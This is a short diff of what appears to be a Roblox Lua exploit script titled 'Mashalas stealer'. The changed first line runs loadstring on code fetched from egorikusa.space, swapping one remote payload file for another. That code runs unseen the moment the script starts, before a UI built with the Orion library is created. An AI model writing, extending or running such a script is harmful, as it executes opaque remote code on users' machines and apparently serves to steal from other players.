@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://egorikusa.space/e93d3416029fa1064c0fa8fa.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/38c306a08a0dbbf06d033dff.lua", true))()
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "Mashalas stealer", HidePremium = false, IntroEnabled = false})
 
